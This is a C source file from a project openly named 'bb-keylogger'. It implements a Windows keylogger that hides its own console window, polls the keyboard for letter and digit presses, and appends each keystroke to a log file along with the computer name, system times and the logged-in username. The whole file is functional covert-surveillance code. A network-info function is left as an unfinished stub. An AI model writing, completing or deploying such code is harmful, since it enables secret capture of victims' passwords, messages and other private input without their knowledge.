/* This file is part of bb-keylogger project.
*
* See the NOTICE file distributed with this work for copyright information.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/

/*
* File:   bb-keyloger.c
* Author: Frapin Kevin
* Date:   22/03/2011
*
* DESCRIPTION
* -----------------------------------------------------------------------------
* File containing all the functions used to log the keystrokes.
* -----------------------------------------------------------------------------
*/

//---------------------------------------------------------------------- DEFINE
#define _WIN32_WINNT 0x0601

//------------------------------------------------------------- SYSTEM INCLUDES
#include <windows.h>

//---------------------------------------------------------- PERSONNAL INCLUDES
#include "includes/bb-keylogger.h"
#include "includes/global.h"

//------------------------------------------------------------------- FUNCTIONS

void initialize_program(  )
{
	HWND hWnd = ( HWND ) GetConsoleWindow( );
	// Hide the console
	ShowWindow( hWnd, SW_HIDE );
	// Detach the process from the console
	FreeConsole( );
}

void log_infos( FILE * log_file, const char * format, ... )
{
	// Get the unamed parameters
	va_list arg_ptr;
	va_start( arg_ptr, format );
	
	// Log the infos
	vfprintf( log_file, format, arg_ptr );
	va_end( arg_ptr );
}

void log_keyboard_state( FILE * log_file )
{
	char * keyboard_state [ BUFFER_SIZE_KB_STATE ];
	int success = GetKeyboardState( ( PBYTE ) keyboard_state );
	if( success != 0 )
	// If it succeeds
	{
		// State of the special keys for capital letter
		int key_caps_lock = GetKeyState( VK_CAPITAL );// 0 or 1
		int key_shift = GetAsyncKeyState( VK_SHIFT ); // 0 or KEY_DOWN_STATE
		int is_cap = ( key_shift == KEY_DOWN_STATE ? 1 : 0 ) ^ key_caps_lock;

		// Check the state of the keys
		// Alphabetic keys
		int i;
		for( i = VK_A; i <= VK_Z; i++ )
		{
			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
			{
				// Put the character in capital letter if necessary
				int ascii = ( is_cap ? i : (i+32) );
				log_infos( log_file, "Keystroke : %c\n", ascii );
			}
		}
		
		// Numeric keys
		for( i = VK_0; i <= VK_9; i++ )
		{
			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
			{
				log_infos( log_file, "Keystroke : %01d\n", i - VK_0 );
			}
		}
		
		for( i = VK_NUMPAD0; i <= VK_NUMPAD9; i++ )
		{
			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
			{
				log_infos( log_file, "Keystroke : %01d\n", i - VK_NUMPAD0 );
			}
		}
		
		// Text modifier keys
		
	}
}

void log_network_infos( FILE * log_file )
{
	// TODO - Get infos : local IP, internet IP
}

void log_system_infos( FILE * log_file )
{
	// Get infos : computer name, system time, local time
	int buffer_size = BUFFER_SIZE_STR;
	char * computer_name [ buffer_size ];
	SYSTEMTIME system_time, local_time;

	GetComputerName( ( LPTSTR ) computer_name, ( LPDWORD ) &buffer_size );
	GetSystemTime( ( LPSYSTEMTIME ) &system_time );
	GetLocalTime( ( LPSYSTEMTIME ) &local_time );
	
	// Log these infos
	log_infos( log_file, "# Computer name : %s\n", computer_name );
			
	log_infos( log_file,
			"# System time : %02d/%02d/%04d - %02d:%02d\n", 
			system_time.wDay, system_time.wMonth, system_time.wYear, 
			system_time.wHour, system_time.wMinute );	
	
	log_infos( log_file, 
			"# Local time : %02d/%02d/%04d - %02d:%02d\n", 
			local_time.wDay, local_time.wMonth, local_time.wYear, 
			local_time.wHour, local_time.wMinute );
}

void log_user_infos( FILE * log_file )
{
	// Get infos : username
	int buffer_size = BUFFER_SIZE_STR;
	char * username [ buffer_size ];
	GetUserName( ( LPTSTR ) username, ( LPDWORD ) &buffer_size );
	
	// Log these infos
	log_infos( log_file, "# Logged user : %s\n", username );
}

FILE * open_file( char * log_file_name )
{
	FILE * log_file = fopen( log_file_name, "a" );
	if( log_file == NULL )
	{
		exit( EXIT_FAILURE );
	}
	
	// No buffer, I/O ASAP
	setbuf ( log_file, NULL );
	
	return log_file;
}








